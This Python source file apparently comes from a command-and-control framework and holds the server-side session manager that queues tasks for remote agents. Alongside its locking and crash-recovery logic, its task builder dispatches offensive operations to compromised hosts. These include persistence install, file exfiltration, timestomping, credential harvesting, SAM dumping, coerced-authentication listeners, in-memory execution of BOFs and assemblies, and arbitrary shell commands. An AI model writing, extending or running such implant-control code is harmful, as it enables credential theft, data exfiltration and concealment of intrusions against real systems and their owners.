"""
server/session.py — Async-safe session manager for server mode.

Wraps the thread-based SessionManager from providers/base.py with:
  - asyncio.Lock for command concurrency (check+set must be atomic)
  - PendingCommand per session (only issuer can overwrite; others get 409)
  - Auto-unlock after cmd_lock_timeout_multiplier × agent_sleep seconds
  - cmd_id → session_id reverse index for notification hooks

Single worker mandate: all state lives in-process; uvicorn MUST be started
with workers=1 so WS broadcast and lock state are never split across processes.
"""

from __future__ import annotations

import asyncio
import os
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Optional, Tuple

from core import Session, SessionManager, send_async
from core import tz as _tz
from providers.base import build_task, _restore_pending_cmd, _session_json_name


def _build_task(session: Session, command: str, cmd_id: str,
                lock_multiplier: int = 5) -> str:
    """Convert a legacy command string into a JSON task envelope."""
    cwd = session.state.snapshot().get("remote_cwd", "")
    cmd_up = command.upper()
    expires_at = time.time() + session.agent_sleep * lock_multiplier

    def _bt(task_type: str, args: dict) -> str:
        return build_task(cmd_id, task_type, args, expires_at)

    if cmd_up == "EXIT":
        return _bt("exit", {})
    if cmd_up == "KILL":
        return _bt("kill", {})
    if cmd_up == "SYSINFO":
        return _bt("sysinfo", {})
    if cmd_up == "ENV":
        return _bt("env", {})
    if command.startswith("SLEEP:"):
        return _bt("sleep", {"seconds": int(command[6:].strip())})
    if command.startswith("JITTER:"):
        return _bt("jitter", {"percent": int(command[7:].strip())})
    if command == "PERSIST_PROBE" or command.startswith("PERSIST_PROBE:"):
        tech = command[14:].lstrip(":") if command.startswith("PERSIST_PROBE:") else ""
        return _bt("persist_probe", {"technique": tech})
    if command.startswith("PERSIST_INSTALL:"):
        return _bt("persist_install", {"technique": command[16:]})
    if command.startswith("PERSIST_REMOVE:"):
        return _bt("persist_remove", {"technique": command[15:]})
    if command.startswith("PERSIST_STATUS:"):
        return _bt("persist_status", {"technique": command[15:]})
    if command.startswith("PERSIST:"):
        # PS-only shorthand: PERSIST:{action} → schtask-logon default technique
        parts = command[8:].split(":", 1)
        return _bt("persist_action", {"action": parts[0], "technique": parts[1] if len(parts) > 1 else ""})
    if command.startswith("DOWNLOAD:"):
        return _bt("download", {"target_path": command[9:]})
    if command.startswith("UPLOAD:"):
        # UPLOAD:<staging_src>:<filename>[:DEST:<dest_path>]
        rest  = command[7:]
        parts = rest.split(":", 1)
        staging = parts[0]
        remainder = parts[1] if len(parts) > 1 else ""
        if ":DEST:" in remainder:
            fname, dest = remainder.split(":DEST:", 1)
        else:
            fname, dest = remainder, ""
        return _bt("upload", {"staging_path": staging, "filename": fname, "dest_path": dest})
    if command.startswith("EXFIL:"):
        return _bt("exfil", {"pattern": command[6:]})
    if command.startswith("TIMESTOMP:"):
        parts = command[10:].split(":", 1)
        return _bt("timestomp", {"target": parts[0], "reference": parts[1] if len(parts) > 1 else ""})
    if command.startswith("TIMESTOMP_SET:"):
        parts = command[14:].split(":", 1)
        return _bt("timestomp_set", {"target": parts[0], "timestamp": parts[1] if len(parts) > 1 else ""})
    if command == "CREDS_HARVEST":
        return _bt("creds_harvest", {})
    if command == "CREDS_COERCE":
        return _bt("creds_coerce", {})
    if command == "CREDS_SAM":
        return _bt("creds_sam", {})
    if command.startswith("CREDS_LISTEN_START"):
        proto = "smb"
        port = 445
        parts = command.split(":")
        if len(parts) >= 2:
            # Format: CREDS_LISTEN_START:proto:port  (e.g. CREDS_LISTEN_START:http:80)
            proto = parts[1] if parts[1] in ("smb", "http") else "smb"
        if len(parts) >= 3:
            try: port = int(parts[2])
            except ValueError: pass
        return _bt("creds_listen_start", {"port": port, "proto": proto})
    if command.startswith("CREDS_LISTEN_STOP"):
        spec = ""
        parts = command.split(":", 1)
        if len(parts) >= 2 and parts[1]:
            spec = parts[1]
        return _bt("creds_listen_stop", {"spec": spec})
    if command == "CREDS_LISTEN_DUMP":
        return _bt("creds_listen_dump", {})
    if command.startswith("BOF_EXEC:"):
        parts = command[9:].split(":", 1)
        return _bt("bof_exec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
    if command.startswith("ASSEMBLY_EXEC:"):
        parts = command[14:].split(":", 1)
        return _bt("assembly_exec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
    if command.startswith("MEMEXEC:"):
        parts = command[8:].split(":", 1)
        return _bt("memexec", {"staging_path": parts[0], "args": parts[1] if len(parts) > 1 else ""})
    if command.startswith("BLOBSAVE:"):
        parts = command[9:].split(":", 2)
        return _bt("blobsave", {
            "did":      parts[0],
            "path_b64": parts[1] if len(parts) > 1 else "",
            "code_b64": parts[2] if len(parts) > 2 else "",
        })
    # Default: shell command with current CWD context
    return _bt("shell", {"cmd": command, "cwd": cwd})


@dataclass
class PendingCommand:
    cmd_id:    str
    command:   str
    issued_by: str
    display:   str = ""
    issued_at: str = field(default_factory=lambda: _tz.now().isoformat())
    expires_at: Optional[str] = None


def _dataclass_to_dict(p: Optional[PendingCommand]) -> Optional[dict]:
    if p is None:
        return None
    return {
        "cmd_id":    p.cmd_id,
        "command":   p.command,
        "issued_by": p.issued_by,
        "display":   p.display,
        "issued_at": p.issued_at,
        "expires_at": p.expires_at,
    }


class ServerSessionManager:
    """
    Async wrapper around the thread-based SessionManager.

    All mutations go through self._lock (asyncio.Lock) so check+set is atomic
    even when multiple WS coroutines race on the same event loop.
    """

    def __init__(self, sessions_dir: Path, project_dir: Path,
                 lock_multiplier: int = 5,
                 key_password: Optional[bytes] = None,
                 hb_warn_multiplier: int = 3,
                 hb_dead_multiplier: int = 6) -> None:
        self._sm             = SessionManager(sessions_dir, project_dir, key_password)
        self._lock           = asyncio.Lock()
        self._pending:       Dict[str, Optional[PendingCommand]] = {}
        self._cmd_session:   Dict[str, str] = {}   # cmd_id → session_id (for hooks)
        self._lock_mult      = lock_multiplier
        self._hb_warn_mult   = hb_warn_multiplier  # LOW-6
        self._hb_dead_mult   = hb_dead_multiplier  # LOW-6

    # ── startup ───────────────────────────────────────────────────────────────

    def _apply_hb_multipliers(self, session: Session) -> None:
        """LOW-6: stamp configurable multipliers onto a session object."""
        session.hb_warn_multiplier = self._hb_warn_mult
        session.hb_dead_multiplier = self._hb_dead_mult

    async def load_all(self) -> None:
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, lambda: self._sm.load_all(run_hb_thread=False))
        now_dt = datetime.now(timezone.utc)
        self._recovery_expired: list[tuple[str, PendingCommand]] = []
        _flush_sids: list[str] = []
        async with self._lock:
            for s in self._sm.all():
                self._apply_hb_multipliers(s)
                # Restore any in-flight PendingCommand that survived a crash
                raw = _restore_pending_cmd(
                    self._sm.sessions_dir / _session_json_name(s.profile)
                )
                _raw_exp = raw.get("expires_at", "") if raw else ""
                try:
                    _exp_dt = datetime.fromisoformat(_raw_exp) if _raw_exp else None
                except ValueError:
                    _exp_dt = None
                if raw and _exp_dt is not None and _exp_dt > now_dt:  # LOW-8
                    p = PendingCommand(**{k: v for k, v in raw.items()
                                         if k in PendingCommand.__dataclass_fields__})
                    self._pending[s.id]       = p
                    self._cmd_session[p.cmd_id] = s.id
                elif raw and raw.get("cmd_id"):
                    # Expired but response may still be on cloud — schedule recovery read
                    p = PendingCommand(**{k: v for k, v in raw.items()
                                         if k in PendingCommand.__dataclass_fields__})
                    self._recovery_expired.append((s.id, p))
                    self._cmd_session[p.cmd_id] = s.id  # routing for _n_output
                    self._pending[s.id] = None
                    _flush_sids.append(s.id)
                else:
                    self._pending[s.id] = None
        # Clear expired _pending_cmd from disk so we don't retry every restart
        for sid in _flush_sids:
            self._flush_pending(sid)

    def start_recovery_pollers(self) -> None:
        """Start AsyncPoller threads for pending commands restored after restart.

        Must be called AFTER notification hooks are installed so that _n_output()
        can route through the server hub and clear pending state via WS broadcast.

        Handles two cases:
        - Active (TTL valid): full poller, pending bar shown in UI.
        - Expired-but-unresolved: poller attempts to read a response that may
          still be sitting on output_path (e.g. server was off overnight).
          No pending bar, but response is recovered if present.
        """
        from providers._monitor import AsyncPoller

        # Active pending commands — full polling
        for sid, p in list(self._pending.items()):
            if p is None:
                continue
            session = self._sm.get(sid)
            if session is None or session.polling_stopped:
                continue
            poller = AsyncPoller(session, "", p.display or p.command,
                                 p.cmd_id, session_token="")
            with session.poller_lock:
                session.poller = poller
            poller.start()

        # Expired commands — still attempt recovery (response may be on cloud)
        for sid, p in self._recovery_expired:
            session = self._sm.get(sid)
            if session is None or session.polling_stopped:
                continue
            # Short timeout: just enough for 2-3 cloud reads. If response is
            # there it'll be found on the first download; no point polling long.
            poller = AsyncPoller(session, "", p.display or p.command,
                                 p.cmd_id, session_token="",
                                 timeout_override=30.0, silent_timeout=True)
            with session.poller_lock:
                session.poller = poller
            poller.start()
        self._recovery_expired = []

    # ── read ──────────────────────────────────────────────────────────────────

    def get(self, session_id: str) -> Optional[Session]:
        return self._sm.get(session_id)

    def all(self) -> list[Session]:
        return self._sm.all()

    def pending(self, session_id: str) -> Optional[PendingCommand]:
        return self._pending.get(session_id)

    def session_for_cmd(self, cmd_id: str) -> Optional[str]:
        return self._cmd_session.get(cmd_id)

    # ── command dispatch ──────────────────────────────────────────────────────

    async def send_command(
        self,
        session_id: str,
        command: str,
        username: str,
        display: Optional[str] = None,
    ) -> Tuple[bool, Optional[PendingCommand], str]:
        """
        Returns (ok, conflict_pending, cmd_id).

        ok=False means another operator holds the lock; conflict_pending has
        their PendingCommand so callers can build the 409 payload.
        """
        session = self._sm.get(session_id)
        if session is None:
            return False, None, ""

        cmd_id = os.urandom(8).hex()

        async with self._lock:
            pending = self._pending.get(session_id)
            if pending is not None and pending.issued_by != username:
                return False, pending, ""

            # Auto-expire: compute absolute expiry timestamp
            timeout_sec = session.agent_sleep * self._lock_mult
            now = datetime.now(timezone.utc)
            from datetime import timedelta
            exp = (now + timedelta(seconds=timeout_sec)).isoformat()

            new_pending = PendingCommand(
                cmd_id    = cmd_id,
                command   = command,
                issued_by = username,
                display   = display or command,
                expires_at= exp,
            )
            # MED-6: remove stale reverse-index entry for this session before inserting new one
            old_pending = self._pending.get(session_id)
            if old_pending is not None:
                self._cmd_session.pop(old_pending.cmd_id, None)
            self._pending[session_id]  = new_pending
            self._cmd_session[cmd_id]  = session_id

        # Flush pending to disk so a crash after upload still recovers cmd_id
        self._flush_pending(session_id)

        loop = asyncio.get_event_loop()
        display_str = display or command
        task_json   = _build_task(session, command, cmd_id, self._lock_mult)

        _faf = command in ("EXIT", "KILL")

        def _on_upload_failure(failed_cmd_id: str) -> None:
            # Upload failed after PendingCommand was already registered — clear it
            # so other operators are not blocked waiting for a response that won't come.
            try:
                asyncio.run_coroutine_threadsafe(
                    self.clear_pending(session_id, failed_cmd_id), loop
                )
            except RuntimeError:
                pass  # loop already closed (server shutdown) — pending will TTL-expire

        def _send():
            send_async(session, task_json, display_str, cmd_id,
                       operator=username, fire_and_forget=_faf,
                       on_upload_failure=_on_upload_failure)

        # MED-21: hold the lock for the duration of the upload so two concurrent
        # send_command calls cannot interleave their cloud writes for the same session.
        async with self._lock:
            await loop.run_in_executor(None, _send)
        return True, None, cmd_id

    async def clear_pending(self, session_id: str, cmd_id: Optional[str] = None) -> None:
        cleared = False
        async with self._lock:
            p = self._pending.get(session_id)
            if p is not None and (cmd_id is None or p.cmd_id == cmd_id):
                self._pending[session_id] = None
                self._cmd_session.pop(p.cmd_id, None)
                cleared = True
        if cleared:
            self._flush_pending(session_id)

    async def expire_locks(self) -> list[str]:
        """Clear locks whose expiry time has passed.  Returns expired session IDs."""
        now = datetime.now(timezone.utc)
        expired_sids = []
        async with self._lock:
            for sid, p in list(self._pending.items()):
                if p is None or not p.expires_at:
                    continue
                try:
                    exp = datetime.fromisoformat(p.expires_at)  # LOW-8
                except ValueError:
                    continue
                if exp < now:
                    # Keep _cmd_session[cmd_id] alive so a recovery poller
                    # can still route the response if the agent replies late.
                    self._pending[sid] = None
                    expired_sids.append(sid)
        for sid in expired_sids:
            self._flush_pending(sid)
        return expired_sids

    # ── session lifecycle ─────────────────────────────────────────────────────

    async def add(self, session: Session) -> None:
        # Stop any HB thread started by the wizard — HBScheduler takes over from here
        hb = getattr(session, "_hb", None)
        if hb is not None and hb.is_alive():
            hb.stop()
        self._apply_hb_multipliers(session)  # LOW-6
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._sm.add, session)
        async with self._lock:
            self._pending[session.id] = None

    async def remove(self, session_id: str) -> bool:
        loop = asyncio.get_event_loop()
        ok   = await loop.run_in_executor(None, self._sm.remove, session_id)
        async with self._lock:
            p = self._pending.pop(session_id, None)
            if p:
                self._cmd_session.pop(p.cmd_id, None)
        return ok

    def stop_all(self) -> None:
        self._sm.stop_all()

    def save_session(self, session_id: str) -> None:
        """Persist current session profile (including mutable timing) to disk."""
        s = self._sm.get(session_id)
        if s is not None:
            p = self._pending.get(session_id)
            self._sm._write_session_file(s, pending_cmd=_dataclass_to_dict(p))

    def _flush_pending(self, session_id: str) -> None:
        """Flush current pending state to the session JSON file (fire-and-forget)."""
        s = self._sm.get(session_id)
        if s is not None:
            p = self._pending.get(session_id)
            self._sm._write_session_file(s, pending_cmd=_dataclass_to_dict(p))

    def stop_polling(self, session_id: str) -> bool:
        return self._sm.stop_polling(session_id)

    def resume_polling(self, session_id: str) -> bool:
        return self._sm.resume_polling(session_id)
